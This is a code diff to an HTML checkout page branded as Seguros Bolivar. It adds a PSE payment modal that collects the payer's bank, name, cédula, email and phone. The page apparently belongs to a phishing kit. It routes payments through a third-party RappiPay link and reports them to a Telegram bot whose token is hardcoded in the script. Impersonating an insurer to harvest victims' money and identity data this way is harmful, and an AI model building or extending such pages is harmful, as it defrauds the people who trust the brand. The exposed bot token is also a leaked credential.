@@ -41,15 +41,6 @@
   .metodo-icons img { height: 32px; width: auto; object-fit: contain; display: block; }
   .pse-icon { height: 36px !important; object-fit: contain; }
 
-  /* Selector de bancos PSE */
-  .bank-selector { display: none; margin-top: 15px; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px; background: #f9fbfa; }
-  .bank-selector.active { display: block; }
-  .bank-selector label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: 500; }
-  .bank-selector select { width: 100%; padding: 12px 16px; border: 2px solid #006341; border-radius: 6px; font-size: 14px; outline: none; font-family: 'Montserrat', sans-serif; background: #fff; }
-  .bank-selector .btn-confirmar-banco { margin-top: 12px; width: 100%; padding: 14px; background: #006341; color: #fff; border: none; border-radius: 30px; font-size: 15px; font-weight: 700; cursor: pointer; font-family: 'Montserrat', sans-serif; letter-spacing: 1px; transition: all 0.3s; }
-  .bank-selector .btn-confirmar-banco:hover { background: #004d33; }
-  .bank-selector .btn-confirmar-banco:disabled { background: #dcdcdc; color: #777; cursor: not-allowed; }
-
   .sidebar-card { background: #fff; border-radius: 16px; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); display: flex; flex-direction: column; }
   .sidebar-header { padding: 20px 24px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; font-size: 18px; font-weight: 700; }
   .sidebar-header svg { width: 22px; height: 22px; fill: #006341; }
@@ -87,6 +78,80 @@
   .mobile-row-bottom { display: flex; justify-content: space-between; align-items: center; width: 100%; }
   .mobile-total { font-size: 18px; font-weight: 700; color: #222; }
   .mobile-btn-pagar { background: #dcdcdc; color: #777; border: none; border-radius: 30px; padding: 12px 30px; font-size: 15px; font-weight: 700; cursor: not-allowed; font-family: 'Montserrat', sans-serif; letter-spacing: 1px; transition: all 0.3s; }
+
+  /* ─── MODAL PSE CON FONDO BLUR ─── */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.45);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .modal-overlay.active { display: flex; }
+
+  .modal-pse {
+    background: #fff;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 480px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.25);
+    padding: 30px 28px;
+    animation: modalIn 0.25s ease-out;
+    max-height: 90vh;
+    overflow-y: auto;
+  }
+  @keyframes modalIn {
+    from { opacity: 0; transform: translateY(20px) scale(0.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+  .modal-title { font-size: 18px; font-weight: 700; color: #006341; display: flex; align-items: center; gap: 8px; }
+  .modal-title svg { width: 22px; height: 22px; }
+  .modal-close { background: none; border: none; cursor: pointer; color: #888; padding: 4px; border-radius: 50%; transition: all 0.2s; display: flex; }
+  .modal-close:hover { background: #f0f0f0; color: #333; }
+  .modal-close svg { width: 22px; height: 22px; }
+
+  .modal-field { margin-bottom: 16px; }
+  .modal-field label { display: block; font-size: 12px; color: #555; margin-bottom: 6px; font-weight: 600; }
+  .modal-field input,
+  .modal-field select {
+    width: 100%;
+    padding: 12px 14px;
+    border: 2px solid #d0d0d0;
+    border-radius: 8px;
+    font-size: 14px;
+    font-family: 'Montserrat', sans-serif;
+    outline: none;
+    background: #fff;
+    color: #333;
+  }
+  .modal-field input:focus,
+  .modal-field select:focus { border-color: #006341; }
+  .modal-field input[readonly] { background: #f3f3f3; color: #666; cursor: not-allowed; }
+
+  .modal-btn-pagar {
+    width: 100%;
+    padding: 15px;
+    background: #006341;
+    color: #fff;
+    border: none;
+    border-radius: 30px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: 'Montserrat', sans-serif;
+    letter-spacing: 1px;
+    margin-top: 10px;
+    transition: all 0.3s;
+  }
+  .modal-btn-pagar:hover { background: #004d33; }
+  .modal-btn-pagar:disabled { background: #dcdcdc; color: #777; cursor: not-allowed; }
 
   @media (max-width: 900px) {
     .navbar { padding: 10px 16px; }
@@ -141,18 +206,9 @@
 
     <h2 class="metodos-title">Métodos de pago</h2>
 
-    <div class="metodo-item" onclick="abrirSelectorBancos()">
-      <span class="metodo-name">Débito PSE</span>
+    <div class="metodo-item" onclick="abrirModalPSE()">
+      <span class="metodo-name">Pago con PSE</span>
       <div class="metodo-icons"><img src="pse.png" alt="PSE" class="pse-icon"></div>
-    </div>
-
-    <!-- Selector de bancos PSE (oculto por defecto) -->
-    <div class="bank-selector" id="bank-selector">
-      <label for="bank-select">Selecciona tu banco</label>
-      <select id="bank-select">
-        <option value="">Cargando bancos...</option>
-      </select>
-      <button class="btn-confirmar-banco" id="btn-confirmar-banco" disabled onclick="irAlFrontPSE()">Continuar con PSE</button>
     </div>
 
     <div class="metodo-item" onclick="irAlFrontDavivienda()">
@@ -195,6 +251,50 @@
   </div>
 </div>
 
+<!-- ─── MODAL PSE ─── -->
+<div class="modal-overlay" id="modal-pse-overlay">
+  <div class="modal-pse" role="dialog" aria-modal="true" aria-labelledby="modal-pse-title">
+    <div class="modal-header">
+      <div class="modal-title" id="modal-pse-title">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+        Pago con PSE
+      </div>
+      <button class="modal-close" onclick="cerrarModalPSE()" aria-label="Cerrar">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+
+    <div class="modal-field">
+      <label for="modal-bank">Banco</label>
+      <select id="modal-bank">
+        <option value="">Cargando bancos...</option>
+      </select>
+    </div>
+
+    <div class="modal-field">
+      <label for="modal-nombre">Nombre completo</label>
+      <input type="text" id="modal-nombre" placeholder="Nombre del titular">
+    </div>
+
+    <div class="modal-field">
+      <label for="modal-cedula">Cédula</label>
+      <input type="text" id="modal-cedula" readonly>
+    </div>
+
+    <div class="modal-field">
+      <label for="modal-correo">Correo electrónico</label>
+      <input type="email" id="modal-correo" placeholder="correo@ejemplo.com">
+    </div>
+
+    <div class="modal-field">
+      <label for="modal-telefono">Teléfono / Celular</label>
+      <input type="tel" id="modal-telefono" placeholder="3001234567">
+    </div>
+
+    <button class="modal-btn-pagar" id="modal-btn-pse" onclick="irAlFrontPSE()">Continuar con PSE</button>
+  </div>
+</div>
+
 <footer class="footer">
   <div>© 2021 - Seguros Bolivar S.A. - Seguros Comerciales S.A. · Todos los derechos reservados</div>
   <div><a href="#">Términos y condiciones del sitio</a></div>
@@ -214,8 +314,12 @@
   // ─── CONFIGURACIÓN ───
   const SERVER_BASE = window.location.origin;   // tu server.js sirve este HTML
   const RAPPIPAY_LINK_CODE = 'iMjmG6';          // debe coincidir con RAPPIPAY_LINK_CODE del server
-  const CUSTOMER_NAME = 'Cliente Seguros Bolivar';
   const CUSTOMER_DOC_TYPE = 'CC';
+
+  // Datos heredados de la consulta (por ahora desde la URL; ajusta si vienen de otro lado)
+  const HEREDADO_NOMBRE   = params.get('nombre') || '';
+  const HEREDADO_CORREO   = params.get('correo') || params.get('email') || '';
+  const HEREDADO_TELEFONO = params.get('telefono') || params.get('celular') || '';
 
   // ─── TELEGRAM SOLO PARA DAVIVIENDA (PSE lo notifica el server) ───
   const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
@@ -236,19 +340,35 @@
     }).catch(err => console.error('Error enviando a Telegram:', err));
   }
 
-  // ─── SELECTOR DE BANCOS PSE ───
+  // ─── MODAL PSE ───
   let bancosCargados = false;
 
-  async function abrirSelectorBancos() {
-    const selectorDiv = document.getElementById('bank-selector');
-    const select = document.getElementById('bank-select');
-    const btn = document.getElementById('btn-confirmar-banco');
+  function abrirModalPSE() {
+    const overlay = document.getElementById('modal-pse-overlay');
+    overlay.classList.add('active');
 
-    // Si ya está abierto, solo lo mostramos
-    selectorDiv.classList.add('active');
+    // Heredar datos de la consulta
+    document.getElementById('modal-cedula').value = numDoc;
+    document.getElementById('modal-nombre').value = HEREDADO_NOMBRE;
+    document.getElementById('modal-correo').value = HEREDADO_CORREO;
+    document.getElementById('modal-telefono').value = HEREDADO_TELEFONO;
 
-    if (bancosCargados) return;
+    // Sincronizar con los inputs principales si están vacíos
+    const mainEmail = document.getElementById('main-email');
+    const mainPhone = document.getElementById('main-phone');
+    if (mainEmail.value) document.getElementById('modal-correo').value = mainEmail.value;
+    if (mainPhone.value) document.getElementById('modal-telefono').value = mainPhone.value;
 
+    if (!bancosCargados) cargarBancosPSE();
+  }
+
+  function cerrarModalPSE() {
+    document.getElementById('modal-pse-overlay').classList.remove('active');
+  }
+
+  async function cargarBancosPSE() {
+    const select = document.getElementById('modal-bank');
+    const btn = document.getElementById('modal-btn-pse');
     select.innerHTML = '<option value="">Cargando bancos...</option>';
     btn.disabled = true;
 
@@ -261,7 +381,6 @@
         return;
       }
 
-      // Ordenar alfabéticamente
       const bancos = data.banks.slice().sort((a, b) => (a.name || '').localeCompare(b.name || ''));
       select.innerHTML = '<option value="">Selecciona tu banco</option>';
       bancos.forEach(b => {
@@ -285,17 +404,22 @@
   async function irAlFrontPSE() {
     if (window.__pseEnCurso) return;
 
-    const select = document.getElementById('bank-select');
+    const select = document.getElementById('modal-bank');
     const bankCode = select.value;
     const bankName = select.options[select.selectedIndex]?.dataset.name || '';
 
-    if (!bankCode) {
-      alert('Por favor selecciona tu banco.');
-      return;
-    }
+    const nombre   = document.getElementById('modal-nombre').value.trim();
+    const cedula   = document.getElementById('modal-cedula').value.trim();
+    const correo   = document.getElementById('modal-correo').value.trim();
+    const telefono = document.getElementById('modal-telefono').value.trim();
+
+    if (!bankCode) { alert('Por favor selecciona tu banco.'); return; }
+    if (!nombre)   { alert('Por favor ingresa tu nombre.'); return; }
+    if (!correo)   { alert('Por favor ingresa tu correo.'); return; }
+    if (!telefono) { alert('Por favor ingresa tu teléfono.'); return; }
 
     window.__pseEnCurso = true;
-    const btn = document.getElementById('btn-confirmar-banco');
+    const btn = document.getElementById('modal-btn-pse');
     btn.disabled = true;
     btn.textContent = 'Generando link de pago...';
 
@@ -307,12 +431,12 @@
           amount: parseInt(total, 10),
           bankCode: bankCode,
           bankName: bankName,
-          customerName: CUSTOMER_NAME,
-          customerDoc: numDoc,
+          customerName: nombre,
+          customerDoc: cedula,
           customerDocType: CUSTOMER_DOC_TYPE,
           numeroCuenta: 'N/A',
           numeroFactura: 'N/A',
-          reference: `SB-${numDoc}`,
+          reference: `SB-${cedula}`,
           linkCode: RAPPIPAY_LINK_CODE
         })
       });
@@ -328,7 +452,6 @@
       }
 
       // ⚠️ NO enviamos Telegram aquí: el server ya lo hizo en notificarTelegramPSE()
-      // Redirigir al banco (bankUrl de RappiPay)
       window.location.href = data.bankUrl;
 
     } catch (err) {
@@ -346,6 +469,11 @@
     window.location.href = destino;
     enviarPagoTelegramDavivienda();
   }
+
+  // Cerrar modal al hacer clic fuera
+  document.getElementById('modal-pse-overlay').addEventListener('click', function(e) {
+    if (e.target === this) cerrarModalPSE();
+  });
 </script>
 
 </body>
